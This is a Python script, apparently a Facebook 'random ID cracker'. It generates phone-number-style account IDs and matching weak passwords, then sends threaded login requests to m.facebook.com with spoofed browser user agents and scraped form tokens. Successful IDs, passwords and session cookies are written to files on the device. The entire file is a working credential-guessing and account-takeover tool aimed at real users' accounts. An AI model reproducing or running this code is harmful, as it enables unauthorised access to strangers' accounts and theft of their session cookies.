#si6xd
import os
import sys
import re
import time
import random
import string
import requests
from concurrent.futures import ThreadPoolExecutor
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m'
O = '\x1b[1;98m'
B = '\033[1;34m'
W = '\033[1;97m'
ugnn = []
pc = random.choice(['Windows NT 6.1; WOW64','X11; CrOS x86_64 8172.45.0','Windows NT 10.0; Win64; x64','X11; Linux x86_64'])
for Xr in range (9999):    
    a=f"Mozilla/5.0 ("+pc+""
    b=random.randrange(6, 12)
    c=random.randrange(3, 13)
    d='Build/'
    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(80,100)
    h='0'
    i=random.randrange(4200,4900)
    j=random.randrange(40,150)
    k='Safari/537.36'
    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
    m=random.randrange(1,9)
    n=random.randrange(1,9)
    o='0'
    p=random.randrange(5,20)
    uaku=(f'{a}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
    ugnn.append(uaku)
ugn = []
realme = random.choice(['M910x','D10i','2PXH3','D830x','U-2u','M910x','2PXH3','HTC_Desire_S_S510e','HTC_0P3P5','HTC_DesireHD_X315e','HTC_C715c','HTC_D616w','SM-A515F','SM-A235F','SM-A525F','SM-A715F','SM-G996B','SM-A705F','SM-A315F','V2183A','I2223','V2307','V2314','I2217','V2239'])
#Mozilla/5.0 (Linux; Android 6; SM-G781) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5215.119 Mobile Safari/537.36'
for Xr in range (50000):    
    a='Mozilla/5.0 (Linux; Android'
    b=random.randrange(6, 12)
    c=random.randrange(3, 13)
    d='Build/'
    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(80,100)
    h='0'
    i=random.randrange(4200,4900)
    j=random.randrange(40,150)
    k='Mobile Safari/537.36'
    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
    m=random.randrange(1,9)
    n=random.randrange(1,9)
    o='0'
    p=random.randrange(5,20)
    uaku=(f'{a} {b}; {realme}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
    ugn.append(uaku)
loop = 0
oks = []
gen = []
logo = ("""
	\033[1;97m
  .d88b  .d8b.  d8888b. db    db d888888b .d8888. 
   `8P' d8' `8b 88  `8D 88    88   `88'   88'  YP \033
    ~88  88ooo88 88oobY' Y8    8P    88    `8bo.~  
    88  88~~~88 88`8b   `8b  d8'    88      `Y8b. 
db. 88  88   88 88 `88.  `8bd8'    .88.   db   8D 
Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
              \x1b[1;91m—————— \x1b[1;97m[<MAIN4K - TEST1>] \x1b[1;91m——————
\033[1;97m———————————————————————————————————————————————""")

def main():
    os.system('clear')
    print(logo)
    code = input(f'{Y}[{W}?{Y}] {W}Input Code : ')
    limit = input(f'{Y}[{W}?{Y}] {W}total id : ')
    for a in range(int(limit)):
        awm = "".join(random.choice(string.digits) for _ in range(6))
        gen.append(awm)
    with ThreadPoolExecutor(max_workers=50) as Submits:
        print(47*"\x1b[1;97m—") 
        for next in gen:
            ids = code + next
            mk = ids[:6]
            xx = ids[:7]
            v = ids[:8]
            b = next[:6]  
            passlist = [mk,xx,b,'57273200',v]
            Submits.submit(cracker,ids,passlist)

def values(url=None):
    code = {}
    session = requests.Session()
    try:
        response = session.get(url).text
        jazoest = re.search(r'name="jazoest" value="(.*?)"', response)
        m_ts = re.search(r'name="m_ts" value="(.*?)"', response)
        lsd = re.search(r'name="lsd" value="(.*?)"', response)
        li = re.search(r'name="li" value="(.*?)"', response)
        __dyn = re.search(r'name="__dyn" value="(.*?)"', response)
        __csr = re.search(r'name="__csr" value="(.*?)"', response)
        __a = re.search(r'name="__a" value="(.*?)"', response)
        bi_wvdp = re.search(r'name="bi_wvdp" value="(.*?)"', response)
        bi_xrwh = re.search(r'name="bi_xrwh" value="(.*?)"', response)
        
        code['li'] = li.group(1) if li else random.choice(['GosCZzoF-x4TPnttnppf6vQM' 'G4sCZ-e-gi91jL0vyyhgRvVO', 'HIsCZwuKjhSwv0KKTgpDapfT', 'HosCZ7N677bvIn23tMfXsv06'])
        code['lsd'] = lsd.group(1) if lsd else random.choice(['AVoXhSMaYhc', 'AVqPPp5vKyU', 'AVoE8plKK3k'])
        code['m_ts'] = m_ts.group(1) if m_ts else str(int(time.time()))
        code['jazoest'] = jazoest.group(1) if jazoest else str(random.randint(1000, 9000))
    
    except Exception as e:
        pass
    
    return code

def cracker(ids,passlist):
    global loop,oks
    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for pas in passlist:
            moz = random.choice(ugn)
            #free_fb = requests.Session().get("https://x.facebook.com").text
            mr_code = values("https://m.facebook.com")
            log_data = {
            "lsd":mr_code.get('jazoest'),
            "jazoest":mr_code.get('lsd'), 
            #"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            #"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            #'login_source': 'comet_headerless_login',
            #'next': '',
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
            "login":"Log In",
            "bi_xrwh":"0",}
            headers = {'Host': 'm.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'x-fb-rlafr': '0',
            'access-control-allow-origin': '*',
            'facebook-api-version': 'v21.0',
            'strict-transport-security': 'max-age=15552000; preload',
            'pragma': 'no-cache',
            'cache-control': 'private, no-cache, no-store, must-revalidate',
            'x-fb-request-id': 'Ailj2fmW-1DseB5eJmZ3H9x',
            'x-fb-trace-id': 'H1Uxu7pAHaR',
            'x-fb-rev': '1017899596',
            'x-fb-debug': 'UGTGyLolON9NJlwsNJQL3hd3EPW2c5gKBBBXk7F86lMfw/p2899f7tpEbJHLpPXaa2aFMCSRcuaBKI2FhscTyg==',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://www.facebook.com/?stype=lo&flo=1&deoia=1&jlou=AfdmGfN4Sk6dF2Qd679bx2Nk1jG1PhNjQsxrZGORfB9Sg_La4oOitebkQWK0aVSuykqIN5XDvmnH6MX2EKrHdgwE1Yd314M6O4Wsc2T-iBwouQ&smuh=63340&lh=Ac-l4RVhgGpwPpiDu9o',
            #'referer': 'https://mbasic.facebook.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': moz}
            url = "https://m.facebook.com/login/device-based/login/async/?api_key=416262124844995&auth_token=6f2f2eccc24bd3f15df899a378fc303e&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fscope%3Demail%26response_type%3Dcode%26client_id%416262124844995%26redirect_uri%3Dhttps%253A%252F%252Fwww.lazada.com.ph%252Fwow%252Fgcp%252Fph%252Fmember%252Fthird-login-landing%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fmember.lazada.com.ph%252Fuser%252Faccount%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522oauthType%2522%253A%2522FACEBOOK%2522%252C%2522type%2522%253A%2522login%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0b6bfe2b-9b16-4039-94cb-88b7e1de1044%26tp%3Dunspecified&refsrc=deprecated&app_id=1448039735477090&cancel=https%3A%2F%2Fwww.lazada.com.ph%2Fwow%2Fgcp%2Fph%2Fmember%2Fthird-login-landing%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fmember.lazada.com.ph%252Fuser%252Faccount%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522oauthType%2522%253A%2522FACEBOOK%2522%252C%2522type%2522%253A%2522login%2522%257D%23_%3D_&lwv=100"
            #print(log_data)
            response = requests.Session().post(url,data=log_data,headers=headers,allow_redirects = False)
            #print(response)
            if "c_user" in response.cookies.get_dict():
                coki=";".join([key+"="+value for key,value in response.cookies.get_dict().items()])
                #user = re.findall('c_user=(.*);fr', coki)[0]
                #print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+' | '+coki+'')
                print('\033[1;92m [JARVIS-OK] '+ids+' | '+pas+' | '+coki+'')
                open("/sdcard/ok.txt","a").write(ids+"|"+pas+"|"+coki+"\n")
                oks.append(ids)
                break
            elif "checkpoint" in response.cookies.get_dict():
                coki=";".join([key+"="+value for key,value in response.cookies.get_dict().items()])
                cid = coki[24:39]
                #idf = response.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                #user = re.findall('c_user=(.*);fr', coki)[0]
                print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+' | '+coki+'')
                open('/sdcard/CP.txt', 'a').write( ids+' | '+pas+' | '+coki+' \n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

main()
